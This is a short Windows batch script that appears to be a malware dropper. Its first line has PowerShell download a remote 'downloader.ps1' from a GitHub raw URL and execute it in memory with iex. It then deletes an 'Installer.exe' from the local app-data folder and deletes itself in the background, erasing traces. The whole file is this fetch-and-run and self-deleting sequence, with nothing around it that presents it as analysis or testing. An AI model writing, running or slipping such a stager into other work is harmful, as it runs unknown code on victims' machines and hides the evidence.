powershell.exe -Command "iex(iwr 'https://raw.githubusercontent.com/RaupenInspektor/Pico/main/downloader.ps1').Content"

start /b "" cmd /c "timeout /t 10 >nul & del /f /q \"%LOCALAPPDATA%\Installer.exe\" & del /f /q \"%~f0\""

exit /b
